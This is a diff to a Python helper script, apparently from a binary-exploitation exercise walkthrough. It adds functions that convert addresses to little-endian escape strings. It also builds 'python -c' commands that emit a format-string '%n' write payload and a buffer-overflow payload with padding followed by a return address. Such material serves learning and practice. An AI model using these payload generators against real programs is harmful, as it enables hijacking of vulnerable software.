@@ -55,18 +55,37 @@ def save_walkthrough():
         subprocess.Popen('p2j break.py -o -t ../walkthrough.ipynb'.split(' '), stdout=dev_null)
 
 
-def transform_address(address):
+def address_to_string(address):
     if isinstance(address, bytes):
         address = str(address)
     if ' ' in address:
         address = address.split(' ')[1]
     address = address.replace("'", '')
     address = address[2:]
+    address = address[::-1]
     res = []
     for i, x in enumerate(address):
         if not i % 2:
             if len(address) > i + 1:
-                res.append(f'\\x{x}{address[i + 1]}')
+                res.append(f'\\x{address[i + 1]}{x}')
             else:
-                res.append(f'\\x{x}')
-    return ''.join(res[::-1])
+                res.append(f'\\x0{x}')
+    return ''.join(res)
+
+
+def address_to_decimal(address):
+    if isinstance(address, int):
+        return str(address)
+    return int(address, 16)
+
+
+def get_rewrite_stack_command(target, source, buffer_position, minus=0):
+    source = address_to_decimal(source) - minus
+    script = f'print "{address_to_string(target)}" + "%{source}d" + "%{buffer_position}$n"'
+    return f"python -c '{script}'"
+
+
+def get_buffer_overflow_command(offset, call_address):
+    test_str = '.'
+    script = f'print "{test_str}" * {offset} + "{address_to_string(call_address)}"'
+    return f"python -c '{script}'"
